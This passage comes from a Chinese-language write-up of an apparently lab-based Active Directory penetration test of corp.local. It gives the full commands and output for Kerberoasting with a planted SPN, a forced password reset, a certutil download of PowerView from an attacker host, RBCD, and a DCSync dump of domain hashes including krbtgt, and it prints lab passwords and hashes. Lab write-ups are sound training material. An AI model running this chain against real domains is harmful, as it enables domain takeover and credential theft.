[+] PFX exportiert nach: sbUXNNXt.pfx
[i] Passwort für PFX: CK7p8TzC0nnrsStz2uY9
[+] Saved PFX (#PKCS12) certificate & key at path: sbUXNNXt.pfx
[*] Must be used with password: CK7p8TzC0nnrsStz2uY9
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/PKINITtools-master]
└─# proxychains -q python3 gettgtpkinit.py \
  -cert-pfx /home/kali/Desktop/tools/pywhisker/save/sbUXNNXt.pfx \
  -pfx-pass 'CK7p8TzC0nnrsStz2uY9' \
  corp.local/salvador \
  /home/kali/Desktop/tools/pywhisker/save/salvador.ccache \
  -dc-ip 172.16.1.5
2026-03-02 05:34:41,848 minikerberos INFO     Loading certificate and key from file
2026-03-02 05:34:41,867 minikerberos INFO     Requesting TGT
Traceback (most recent call last):
  File "/home/kali/Desktop/tools/PKINITtools-master/gettgtpkinit.py", line 349, in <module>
    main()
  File "/home/kali/Desktop/tools/PKINITtools-master/gettgtpkinit.py", line 345, in main
    amain(args)
  File "/home/kali/Desktop/tools/PKINITtools-master/gettgtpkinit.py", line 315, in amain
    res = sock.sendrecv(req)
          ^^^^^^^^^^^^^^^^^^
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)" 
```

#### 报错
```plain
KDC_ERR_PADATA_TYPE_NOSUPP
"KDC has no support for PADATA type"
```

👉 **域控不支持 PKINIT 认证**

也就是：

❌ 不能用证书登录 Kerberos  
❌ 没有 AD CS 或未启用 PKINIT  
❌ Shadow Credentials 利用失败

##### 🧠 Kerberos 两种认证方式
Kerberos 获取 TGT 有两种：

###### ① 传统密码认证
```plain
用户名 + 密码 / NTLM hash
```

最常见：

```plain
kinit
impacket
```

---

###### ② PKINIT（证书认证）
```plain
用户名 + 证书
```

👉 只有当域部署了证书服务（AD CS）才行

---

##### 🔥 你的攻击链本来是这个
你用的是：

**🧨**** Shadow Credentials 攻击**

由 pywhisker 实现

---

##### 📌 pywhisker 做了什么？
你执行：

```plain
pywhisker --action add
```

它干的是：

👉 修改目标用户 salvador 的：

```plain
msDS-KeyCredentialLink
```

这个属性允许：

```plain
给账户绑定一个证书身份
```

也就是：

🔥 给别人账户偷偷添加一个“无密码登录方式”

---

##### 📦 生成的 PFX 是什么？
```plain
sbUXNNXt.pfx
```

里面包含：

+ 私钥
+ 证书
+ 可用于 PKINIT

---

##### 🎯 gettgtpkinit.py 的作用
这个工具来自 PKINITtools：

👉 用证书向 KDC 请求 Kerberos TGT

---

###### 📊 它干的事情：
```plain
证书 → PKINIT → TGT → ccache
```

成功的话你会得到：

```plain
salvador.ccache
```

然后可以：

```plain
export KRB5CCNAME=salvador.ccache
```

直接 impersonate salvador。

---

##### 🧠 整条攻击链逻辑
```plain
AllExtendedRights
      ↓
pywhisker 写 KeyCredentialLink
      ↓
生成证书
      ↓
PKINIT 获取 TGT
      ↓
无需密码登录 salvador
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/PKINITtools-master]
└─# proxychains -q certipy-ad find -u pgibbons -p 'I l0ve going Fishing!' -dc-ip 172.16.1.5 -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[-] Got error: ("('socket ssl wrapping error: [SSL: UNEXPECTED_EOF_WHILE_READING] EOF occurred in violation of protocol (_ssl.c:1033)',)",)
[-] Use -debug to print a stacktrace             
```

### SPN-kerberoast (失败)
#### 原理
##### 📌 本质一句话：
👉 **让某个账号“扮演一个服务”并支持 Kerberos 认证**

---

##### 🏢 正常环境下的用途
SPN 用来标识：

```plain
某台服务器上的某个服务
```

 例如：  

| 服务 | SPN 示例 |
| --- | --- |
| SQL Server | MSSQLSvc/sql01.corp.local |
| Web | HTTP/web01 |
| File | CIFS/fileserver |


** ****🔥**** 设置 SPN = 制造 Kerberoasting 目标  **

##### 🧨 攻击流程
如果你对某账号有权限（如 AllExtendedRights）：

##### 👉 可以给它设置 SPN
```plain
setspn -a fake/http targetuser
```

---

##### 👉 然后请求 TGS
Kerberos 会返回：

```plain
用该账号密码派生密钥加密的票据
```

---

##### 👉 离线破解
如果密码弱：

💣 直接得到账号明文密码

#### 利用
```c
certutil -urlcache -f http://10.10.16.4/PowerView.ps1 C:\Users\Public\Downloads\PowerView.ps1

Import-Module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'I l0ve going Fishing!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('corp.local\pgibbons', $SecPassword)
Set-DomainObject -Credential $Cred -Identity salvador -SET @{serviceprincipalname='foobar/xd'}
```

```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/tools/pywhisker/save]
└─# proxychains -q impacket-GetUserSPNs  -dc-ip 172.16.1.5 corp.local/pgibbons:'I l0ve going Fishing!' -request-user salvador
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name      MemberOf                                PasswordLastSet             LastLogon                   Delegation 
--------------------  --------  --------------------------------------  --------------------------  --------------------------  ----------
foobar/xd             salvador  CN=IT Admins,CN=Users,DC=corp,DC=local  2018-04-26 14:27:09.173509  2018-05-15 21:04:05.608073             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*salvador$CORP.LOCAL$corp.local/salvador*$547b481fac659ed3751d65825f52416d$4a3541062cd047930f8298f27a506b3073df79b30210b4fee6d8d5722f9d33d67d2d96ad09ef4312cd44a089bd874b5e48a4170c639ce7f97c6fbdcf476a2db56969f6cf86397d325d8b35ff20528a58aad58b6b644ba2bbd20b855572f6b50a581dfc1d6a51bf115c461b7548c593f2d81a7facf0ac343381639099562dfc70058370843befe0fad24a911f3d21078836481eec3da74fa0e3c655ced7d3f676ee87ea3ea70b5a02ea4c3729df395f240bbd3d886a0e8383b27aeba973a956acdf6a4a3de2245bfc59f9233f9e136c506d23b22adf2914fc277ab58ed8034b0337a55b6b5c87970d29be5969c9f30362391b9f4f1aa3c4e507f320c07c04ba57af72c66fe34e250cf99af57878fd0cdc38c35150acc0d2851424eb08499e1e5f87565f2ad6ce8a02836ced7d002bb0747867c1fdcfde6ed950009874556344322e4d56c2ac11fb50637c5bbb13c6e214584835cefc14d1525ecc0ced3657a2aa86a0d09c52e7f1c2a8e1cf328f8e16a85531024713054be1f8eb57404139a5011c1470d0d7094790430dff2fc6ef68b86ea00d29e3d7866ef7329d9f219d03268dd07eb5c1af4af66c40b276980bf32f38cb6d5de090e0473eb6cb48426a3a712b83fa58377b04fe7c9871663475b8a1a56f0d881eb12abc33106893984c9234e26bb59efbb5a478d9c7fcbac94a7ee93e6aed565e954240fe035294cb31b889d6f60b5dc179f45f4194c3087cec7910576a692d6f0c4e98c7981dfd607f0bdcc7159e0749d2a2f60cf45be3caa19aa75e2e9dc6346f3bc0d77e50b8d8c7111c3e3324bf4d46546625175626a23a4b9bad97ef7e53cb42f7bfebc25b001f8b007e454c4c6821d4345196dca03f22f81fb026db137b2eee2da61631b03dcbce40ce2f01d0f0d4823fd0b3decea010bf9130987957ae8ee1f4cded721f7c9e0896c19cc31c3a80e6710e744f92f324064e3d32aa8666ca6047c6cceb2188267e9927740219a96d7c2c6b3b203328c1f61ad59ba3358d301015b6215efa7e97196df7650ae8ba55bc15508b1e7eda42067bfe7c9f2578218dd9ab5dd82eb155fc25bd015472a1fec167b57a54b55f1c5e3f57061b20cdde80a092e892ffea1f242c6b77608603c01073df17d4c3c090b84503e260dda2ebb59f10a755f67c29192083e43052a22ce756fdfa4101c1007b239af52772cea1b888c3fea985a0c12f428fc7f865285a53ad44ec65e3b989c081cca2a9002bf8890ecb5e555ef91df94caea3a0f1afefc06a693a5ffc39e9e6ccb0eac00a2533ea5a14a2e77202605142e7c2ae1ec1b085f447efef505dcf5afa8c1448f169ec651c1c2822d3bd826232535a6961efcfedf5024dcc38892d864182c0b774d154f2e77c1eac2c2d5ea2a780e5f572234e66b18060790373f3ecd993623ad8cde8a210ad2939
```

第二步也可以使用Rubeus

```c
C:\Users\Public\Rubeus.exe kerberoast /nowrap /outfile:c:\users\public\get.txt
```

##### 🧠 逐行解释
###### ① 导入 PowerView
```plain
Import-Module .\Powerview.ps1
```

加载 AD 攻击工具（PowerView）

---

###### ② 构造凭据
```plain
$SecPassword = ConvertTo-SecureString 'I l0ve going Fishing!' -AsPlainText -Force
```

把明文密码转成 SecureString

---

```plain
$Cred = New-Object System.Management.Automation.PSCredential('corp.local\pgibbons', $SecPassword)
```

生成凭据对象：

```plain
用户名：pgibbons
密码：I l0ve going Fishing!
域：CORP.LOCAL
```

👉 用 pgibbons 身份执行后续操作

---

###### ③ 修改 AD 对象属性
```plain
Set-DomainObject -Credential $Cred -Identity salvador -SET @{serviceprincipalname='foobar/xd'}
```

这一步非常关键 👇

---

###### 🧨 实际效果
👉 给用户 salvador 添加 SPN：

```plain
foobar/xd
```

foobar/xd 为一个虚拟的服务也可以设置其它的字符串

---

###### 📌 为什么这么做？
**🔥**** 为了 Kerberoasting**

---

一旦 salvador 有 SPN：

**👉**** 任何域用户都可以请求：**

```plain
salvador 的 Kerberos 服务票据（TGS）
```

---

这个 TGS：

💀 用 salvador 的密码派生密钥加密

#### hashcat
没爆破出来

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# hashcat -m 13100 spn /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
hashcat (v7.1.2) starting

/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt: No such file or directory                                        

Started: Mon Mar  2 07:00:33 2026
Stopped: Mon Mar  2 07:00:33 2026
                                                    
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# hashcat -m 13100 -O spn /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 6800HS with Radeon Graphics, 2930/5861 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Comparing hashes with potfile entries. Please be patHashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Initializing device kernels and memory. Please be paInitializing backend runtime for device #1. Please bHost memory allocated for this attack: 513 MB (3521 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

                                                    [s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]u                                                    Approaching final keyspace - workload adjusted.

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]u                                                    Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*salvador$CORP.LOCAL$corp.local/salvado...ad2939
Time.Started.....: Mon Mar  2 07:02:25 2026 (8 secs)
Time.Estimated...: Mon Mar  2 07:02:33 2026 (0 secs)
Kernel.Feature...: Optimized Kernel (password length 0-31 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1796.9 kH/s (1.50ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 3094/14344385 (0.02%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: !!rebound!! -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 53%

Started: Mon Mar  2 07:02:12 2026
Stopped: Mon Mar  2 07:02:34 2026
```

### 修改密码 (前提-导入Powerview.ps1)
```c
certutil -urlcache -f http://10.10.16.4/PowerView.ps1 C:\Users\Public\Downloads\PowerView.ps1
Import-Module .\PowerView.ps1
```

```c
$user = 'corp.local\pgibbons';
$pass= ConvertTo-SecureString 'I l0ve going Fishing!' -AsPlainText -Force;
$creds = New-Object System.Management.Automation.PSCredential $user, $pass;
$newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force;
Set-DomainUserPassword -Identity salvador -AccountPassword $newpass -Credential $creds;
```

### 验证
```c
proxychains -q crackmapexec smb 172.16.1.5 -u salvador -p 'Password123!'
SMB         172.16.1.5      445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:True)
SMB         172.16.1.5      445    DC01             [+] corp.local\salvador:Password123!                  
```

# 172.16.1.24(Windows)（Setp:7）
## 域管凭据
```c
corp.local\cyber_adm:Password123!
corp.local\cyberops_svc:Password123!
```

## evil-winrm
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q evil-winrm -i 172.16.1.24 -u cyber_adm -p 'Password123!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                               
                                        
Data: For more information, check Evil-WinRM GitHubhttps://github.com/Hackplayers/evil-winrm#Remote-pa-completion                                        
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\cyber_adm\Documents> cd /
*Evil-WinRM* PS C:\> dir
                                                                       
                                                                       
    Directory: C:\                                                     
                                                                       
                                                                       
Mode                LastWriteTime         Length Name                  
----                -------------         ------ ----                  
d-----         2/6/2020   8:26 PM                inetpub               
d-----         2/6/2020   5:55 PM                PerfLogs              
d-r---        1/29/2025   6:14 AM                Program Files         
d-----        9/18/2020   3:53 PM                Program Files (x86)   
d-r---         3/1/2020  11:32 AM                Users
d-----         4/1/2025   4:05 AM                Windows


*Evil-WinRM* PS C:\>
```

可以发现多出了iis目录

## web.config
```c
*Evil-WinRM* PS C:\> type inetpub\wwwroot\Web.config
<?xml version="1.0" encoding="utf-8"?>
<!--
  For more information on how to configure your ASP.NET application, please visit
  https://go.microsoft.com/fwlink/?LinkId=169433
  -->
<configuration>
  <connectionStrings>
    <add name="login" connectionString="server=172.16.1.15;database=Users;uid=sql_read;password=SQLP@$$w0rD_read;" />
    <add name="saLogin" connectionString="server=172.16.1.15;database=Documents;uid=sa;password=SQLP@$$w0rD;" />
  </connectionStrings>

 <location path="login.aspx">

  <system.web>

   <authorization>

    <allow users="corp\svc_iis"/>

    <deny users="*"/>

   </authorization>

  </system.web>

 </location>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.1" />
      </system.Web>
  -->
  <system.web>
    <compilation targetFramework="4.6.1" />
    <httpRuntime targetFramework="4.6.1" />
    <pages>
      <namespaces>
        <add namespace="System.Web.Optimization" />
      </namespaces>
      <controls>
        <add assembly="Microsoft.AspNet.Web.Optimization.WebForms" namespace="Microsoft.AspNet.Web.Optimization.WebForms" tagPrefix="webopt" />
      </controls>
    </pages>
    <!--<httpHandlers>
      <remove verb="*" path="*.asmx"/>
      <add verb="*" path="*.asmx" type="System.Web.Script.Services.ScriptHandlerFactory" validate="false"/>
    </httpHandlers>-->
    <!--<webServices>
      <protocols>
        <remove name="Documentation"/>
      </protocols>
    </webServices>-->
    <webServices>
      <wsdlHelpGenerator href="helpPage.aspx" />
    </webServices>
  </system.web>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="Antlr3.Runtime" publicKeyToken="eb42632606e9261f" />
        <bindingRedirect oldVersion="0.0.0.0-3.5.0.2" newVersion="3.5.0.2" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="Newtonsoft.Json" publicKeyToken="30ad4fe6b2a6aeed" />
        <bindingRedirect oldVersion="0.0.0.0-12.0.0.0" newVersion="12.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="WebGrease" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="0.0.0.0-1.6.5135.21930" newVersion="1.6.5135.21930" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
  <system.codedom>
    <compilers>
      <compiler language="c#;cs;csharp" extension=".cs" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.CSharpCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=2.0.1.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" warningLevel="4" compilerOptions="/langversion:default /nowarn:1659;1699;1701" />
      <compiler language="vb;vbs;visualbasic;vbscript" extension=".vb" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.VBCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=2.0.1.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" warningLevel="4" compilerOptions="/langversion:default /nowarn:41008 /define:_MYTYPE=\&quot;Web\&quot; /optionInfer+" />
    </compilers>
  </system.codedom>
  <system.serviceModel>
    <bindings />
    <client />
  </system.serviceModel>
  <system.webServer>
    <handlers>
      <remove name="ExtensionlessUrlHandler-Integrated-4.0" />
      <remove name="OPTIONSVerbHandler" />
      <remove name="TRACEVerbHandler" />
      <add name="ExtensionlessUrlHandler-Integrated-4.0" path="*." verb="*" type="System.Web.Handlers.TransferRequestHandler" preCondition="integratedMode,runtimeVersionv4.0" />
    </handlers>
  </system.webServer>
</configuration>
<!--ProjectGuid: 2BA7A017-37F1-4230-8D80-16BD0D54B44B-->
```

得到凭据

```c
server=172.16.1.15
sa
SQLP@$$w0rD
```

```c
proxychains -q impacket-mssqlclient sa:'SQLP@$$w0rD'@172.16.1.15
```

## Getflag
```plain
type \users\administrator\desktop\flag.txt
OFFSHORE{it_@ll_c0m3s_FuLl_c1rcl3}
```

## 横向移动
### 攻击链
```c
*Evil-WinRM* PS C:\Users\cyber_adm\Documents> hostname
WEB-WIN01
```

WEB-WIN01->LEGACY WEB SERVERS->DC01



![](/image/prolabs/Offshore-38.png)

### LEGACY WEB SERVERS
```c
PS C:\Users> net group "LEGACY WEB SERVERS" /domain
net group "LEGACY WEB SERVERS" /domain
The request will be processed at a domain controller for domain corp.local.

Group name     Legacy Web Servers
Comment        

Members

-------------------------------------------------------------------------------
WEB-WIN01$               
The command completed successfully.
```

+ 你当前身份：`**corp\cyber_adm**`
+ **不在** Legacy Web Servers 组
+ 组成员只有：

```plain
WEB-WIN01$
```

说明：

👉 是 **机器账户 WEB-WIN01$** 在那个组里  
👉 不是 cyber_adm

而 BloodHound 显示：

**Legacy Web Servers 组 对 DC01 有 WriteDacl / GenericWrite**

所以真正有权限写 DC01 的是：

```plain
WEB-WIN01$
```

### RBCD利用原理
#### 🏗 一、Delegation 本质是什么？
在 AD 里，Delegation 的意思是：

**允许一个服务代表用户去访问另一个服务。**

举例：

+ 用户登录 Web 服务器
+ Web 服务器帮用户访问 SQL
+ SQL 需要知道“这个请求是用户发的”

这就用到了 Kerberos 委派。

---

#### 🔥 二、传统委派 vs RBCD
##### 传统 Constrained Delegation
管理员在“源对象”上配置：

```plain
这个服务器可以委派到哪些服务
```

---

##### RBCD（资源基委派）
反过来：

```plain
目标服务器决定谁可以委派到我
```

这就是：

**资源控制谁能代表用户访问我**

### RBCD利用 (失败)
#### 第一步：dump 机器账户 hash
```plain
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q impacket-secretsdump cyber_adm:'Password123!'@172.16.1.24

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe7def997508649af56da0db6642c5127
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
CORP.LOCAL/iamtheadministrator:$DCC2$10240#iamtheadministrator#3c1e5b31c203b2b52920f7ce19110ab4: (2025-04-01 11:04:45+00:00)
CORP.LOCAL/cyber_adm:$DCC2$10240#cyber_adm#ee8b8a73592431ca1acfe882323ab8b4: (2020-03-01 19:32:07+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CORP\WEB-WIN01$:aes256-cts-hmac-sha1-96:e139bd865058ba403471716ffe789beccc8116a9f232572bfe8cd2129b45d4f4
CORP\WEB-WIN01$:aes128-cts-hmac-sha1-96:8635be8c78d9d06371fadc2962a4dee8
CORP\WEB-WIN01$:des-cbc-md5:02f404087cab231f
CORP\WEB-WIN01$:plain_password_hex:5300700028006f00520069005a0058007100400065004d007200440051002c0068006900510068006400450059004a00480040005b00690038007200640033004c0078003c00290035003d003200780033002e005b007900690045005600270077006a006c004600420060005e00330076003e0075002f005700710062005c0037006d006c005b003b006200350044007600580060002e003a005c005700660045007800600048004d006800350032003200430073002c005100630073004b00260047005d0059002f0062003700230047003b005300200042002a00620078006d006500210078004000370058003200
CORP\WEB-WIN01$:aad3b435b51404eeaad3b435b51404ee:e3d78bc48d069bba3d3e34b0cae59547:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x0f8f8a62c9b4c944b082cf988bfc7220d7316481
dpapi_userkey:0x44988ebbe9ac69fc27517e8f04f3865bed2e4b8b
[*] NL$KM 
 0000   3D 3D E8 3C D1 46 2B 26  15 28 5F D7 F6 60 C4 2C   ==.<.F+&.(_..`.,
 0010   FC 31 A1 08 82 BD 8F 1B  C8 59 44 5C 20 DC AC 54   .1.......YD\ ..T
 0020   54 DE 73 3A 14 1A 39 D3  9D 19 3D 83 1C E6 41 3D   T.s:..9...=...A=
 0030   2E B9 01 9F 68 75 53 A3  C5 75 B4 AC 54 8E 85 3A   ....huS..u..T..:
NL$KM:3d3de83cd1462b2615285fd7f660c42cfc31a10882bd8f1bc859445c20dcac5454de733a141a39d39d193d831ce6413d2eb9019f687553a3c575b4ac548e853a
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

#### 第二步：回到 Kali 用机器账户打 RBCD
##### 1️⃣ 创建一个新的机器账户
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/netcat]
└─# proxychains -q impacket-addcomputer corp.local/WEB-WIN01$ -hashes :e3d78bc48d069bba3d3e34b0cae59547 -dc-ip 172.16.1.5 -computer-name ATTACKER$ -computer-pass Passw0rd!
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ATTACKER$ with password Passw0rd!.
```

##### 2️⃣ 写 RBCD 到 DC01
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/netcat]
└─# proxychains -q impacket-rbcd corp.local/WEB-WIN01$ -hashes :e3d78bc48d069bba3d3e34b0cae59547 -dc-ip 172.16.1.5 -action write -delegate-from ATTACKER$ -delegate-to DC01$
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKER$ can now impersonate users on DC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKER$    (S-1-5-21-2291914956-3290296217-2402366952-17101)
```

##### 3️⃣ 伪造票据 impersonate Administrator
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-getST corp.local/ATTACKER$:'Passw0rd!' -dc-ip 172.16.1.5 -spn ldap/DC01.corp.local -impersonate Administrator                                

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@ldap_DC01.corp.local@CORP.LOCAL.ccache
```

会生成：

```plain
Administrator@cifs_DC01.corp.local@CORP.LOCAL.ccache
```

##### 4️⃣ 导出 Kerberos 票据
```plain
export KRB5CCNAME=Administrator@cifs_DC01.corp.local@CORP.LOCAL.ccache
```

##### 5️⃣ 直接 DCSync
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-secretsdump -k -no-pass DC01.corp.local
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Cleaning up... 
```

现在：

+ ✅ RBCD 成功
+ ✅ LDAP 票据正确
+ ✅ Kerberos 票据加载成功
+ ❌ 仍然被：

```plain
Policy SPN target name validation might be restricting full DRSUAPI dump
```

拦住

---

#### 失败原因
这不是票据问题。

这是因为：

**你在对**** ****DC01 计算机对象**** ****做 RBCD**

但 DCSync 需要的是：

```plain
对域对象 corp.local 拥有 Replication 权限
```

⚠️ RBCD 只是让你可以“登录 DC 的服务”  
并没有给你：

```plain
Replicating Directory Changes
Replicating Directory Changes All
```

权限。

### DCSync利用
```plain
机器账户
   ↓
组成员
   ↓
对域对象有 WriteDacl
   ↓
修改域 ACL
   ↓
给自己 DCSync 权限
   ↓
复制域数据库
   ↓
拿 krbtgt
```

👉 WriteDacl 给自己加 DCSync 权限。

(在域对象 DC=corp,DC=local 上，给 WEB-WIN01$ 添加“复制目录”的权限。)

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-dacledit \
corp.local/WEB-WIN01$ \
-hashes :e3d78bc48d069bba3d3e34b0cae59547 \
-dc-ip 172.16.1.5 \
-action write \
-rights DCSync \
-principal WEB-WIN01$ \
-target-dn "DC=corp,DC=local"
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260302-120008.bak
[*] DACL modified successfully!
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-secretsdump \
'corp.local/WEB-WIN01$@172.16.1.5' \
-hashes :e3d78bc48d069bba3d3e34b0cae59547
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0109d7e72fcfe404186c4079ba6cf79c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cba2ed22077aa56ae957bcf43a8d82f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bob:1110:aad3b435b51404eeaad3b435b51404ee:b38c126d0faabc61362ecc83ccb0cd08:::
joe:1111:aad3b435b51404eeaad3b435b51404ee:fde396caf28acc233207b2706483024f:::
bill:1113:aad3b435b51404eeaad3b435b51404ee:47b4d6012d7dcf231d8533758231c80d:::
salvador:1114:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
lazy_admin:1119:aad3b435b51404eeaad3b435b51404ee:d168f91992f800743144f24518de5f2b:::
vincent.delpy:1120:aad3b435b51404eeaad3b435b51404ee:f5e7702e1032710f9f16ef8a691da861:::
iamtheadministrator:1122:aad3b435b51404eeaad3b435b51404ee:70016778cb0524c799ac25b439bd67e0:::
justalocaladmin:1603:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::
corp.local\GStephenson:1604:aad3b435b51404eeaad3b435b51404ee:a6c9bca7e1f4076c538ff6e7096d59be:::
corp.local\AMountgarrett:1605:aad3b435b51404eeaad3b435b51404ee:4b76b38df5e9adf9739c8f43869d91ce:::
corp.local\JHann:1606:aad3b435b51404eeaad3b435b51404ee:1d863479e1ab3bd62a2bfafa1abaa2dd:::
corp.local\LBellantoni:1607:aad3b435b51404eeaad3b435b51404ee:2c019748d27c982f3be03c378759a954:::
corp.local\LGresham:1608:aad3b435b51404eeaad3b435b51404ee:520d2dcba9759412cda4eeeb524e5407:::
corp.local\EReynolds:1609:aad3b435b51404eeaad3b435b51404ee:bb413fd4eab36d867ae30ca134911ef6:::
corp.local\MTorres:1610:aad3b435b51404eeaad3b435b51404ee:a1e69cd82485430ad9f732a7673b0732:::
……
```

## 登录域控
```plain
proxychains -q evil-winrm -i 172.16.1.5 -u administrator -H 0109d7e72fcfe404186c4079ba6cf79c
```



# 172.16.1.26(Windows)（Setp:8-Getflag）
## SMB凭据
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q crackmapexec smb 172.16.1.1/24 -u usersname -p pass 

SMB         172.16.1.26     445    FS01             [*] Windows Server 2016 Standard 14393 x64 (name:FS01) (domain:corp.local) (signing:False) (SMBv1:True)
